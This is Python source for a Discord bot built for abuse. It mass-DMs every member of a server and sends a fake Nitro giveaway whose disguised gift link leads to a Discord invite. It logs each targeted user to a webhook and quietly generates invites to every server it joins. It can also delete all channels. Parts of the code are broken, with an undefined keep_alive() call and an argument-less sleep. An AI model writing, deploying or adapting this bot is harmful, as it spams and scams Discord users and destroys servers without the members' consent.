import discord
from discord.ext import commands
import asyncio
import os
import requests
import datetime

client = commands.Bot(command_prefix='.',
intents=discord.Intents.default().all(),
help_command=None)

whitelisted = [1151017671299698688, 1082514034366091284, 1064344164248064111, 655121403649196042]


@client.event
async def on_ready():

  invite_link = discord.utils.oauth_url(
   client.user.id, permissions=discord.Permissions(permissions=8))

  print(f"Logged in as {client.user.name}")
  print(f"Invite link: {invite_link} ")
  invite_links = []

  for guild in client.guilds:
    invite_link = await guild.text_channels[0].create_invite()
    invite_links.append(f'Invite link for {guild.name}: {invite_link}')

  response = '\n'.join(invite_links)
  print(response)


webhook_url = my_secret = os.environ['WEBHOOK']


@client.command()
async def dmall(ctx, *, message: str):

  total_members = len(
   [member for member in ctx.guild.members if not member.bot])
  estimated_time = total_members * 3
  current_time = datetime.datetime.now().strftime('%m/%d/%Y %I:%M %p')
  embed = discord.Embed(title="Mass DM Initated", color=0x3498DB)
  embed.add_field(name="⏰ Aprox Time",
                  value=f"``{estimated_time} SECONDS``",
                  inline=False)
  embed.add_field(name="🕵️‍♂️ Initated by",
                  value=f"``{ctx.author}``",
                  inline=False)
  embed.set_footer(text=current_time)

  await ctx.send(embed=embed)
  if ctx.author.id in whitelisted:
    for member in ctx.guild.members:
      if not member.bot:
        try:
          await asyncio.sleep()
          await member.send(message)
          print(f"Success: {member}")
          memberid = member.id
          send_webhook_message(
           f"``✅ SUCCESS`` **{member}** (<@{memberid}>)")
        except:
          print(f"Failed: {member}")
          send_webhook_message(
           f"``❌ FAILED`` **{member}** (<@{memberid}>)")
  else:
    await ctx.send("Only the owner can use this command.")


@client.command()
async def gw(ctx):
  total_members = len(
   [member for member in ctx.guild.members if not member.bot])
  estimated_time = total_members * 3
  current_time = datetime.datetime.now().strftime('%m/%d/%Y %I:%M %p')

  e = discord.Embed(title="Mass DM Initiated", color=0x3498DB)
  e.add_field(name="⏰ Approximate Time",
              value=f"``{estimated_time} SECONDS``",
              inline=False)
  e.add_field(name="🕵️‍♂️ Initiated by",
              value=f"``{ctx.author}``",
              inline=False)
  e.set_footer(text=current_time)
  await ctx.send(embed=e)

  if ctx.author.id in whitelisted:
    for member in ctx.guild.members:
      if not member.bot:
        try:
          await asyncio.sleep(3)
          embed = discord.Embed(title="Giveaway Winner!",
                                description="You just won **1 Month Nitro Boost**.",
                                color=0x3498DB)
          embed.add_field(
           name="Nitro Code Click to Claim:",
           value=
           "[discord.gift/jrVPPaK7dB9HXawfPswz3uS9](https://discord.gg/eMpRfUXTsz)")
          await member.send(
           "**🎉You have been selected to participate in a special raffle!**\n\nJoin to participate: https://discord.gg/qx7t6bEPxt"
          )
          send_webhook_message(
           f"``✅ SUCCESS`` **{member},{member.id}** (Embed Version)")
        except:
          send_webhook_message(
           f"❌ FAILED: **{member.name}** (Embed Version)")
  else:
    await ctx.send("Only the owner can use this command.")


def send_webhook_message(content):
  data = {"content": content}
  requests.post(webhook_url, json=data)


@client.command()
async def help(ctx):
  embed = discord.Embed(
   title="Help",
   description=
   "[Support](https://discord.gg/zvVMXBRk) | [Invite]( https://discord.com/oauth2/authorize?client_id=1191489514066165830&scope=bot+applications.commands&permissions=8)",
   color=0x3498DB)
  embed.add_field(name="dmall <Text>",
                  value="Send a DM to every user in a server.",
                  inline=False)
  embed.add_field(
   name="gw",
   value="Send a Embed (Nitro Message) to every user in a server.",
   inline=False)
  embed.set_thumbnail(
   url= "https://cdn.discordapp.com/avatars/1189088044926631996/da5c999799dbc94c71349c2063d04bce.webp?size=1024&width=0&height=256"
  )
  embed.set_footer(text="Melon")
  await ctx.send(embed=embed)


@client.command()
async def dm(ctx, user: discord.User, *, message: str):
  if ctx.author.id in whitelisted:
    await user.send(message)
    await ctx.send(f"``✅ SUCCESS`` | Sent a DM to **{user.name}**.")
  else:
    await ctx.send("Only the owner can use this command.")
  
@client.command()
async def delall(ctx):
    if ctx.author.guild_permissions.manage_channels:
        new_channel = await ctx.guild.create_text_channel('announcements')

        for channel in ctx.guild.channels:
            if channel != new_channel:
                await channel.delete()

        await new_channel.send("All channels have been deleted.")
    else:
        await ctx.send("You don't have the required permissions to perform this action.")


keep_alive()
client.run(os.getenv("DISCORD_TOKEN"))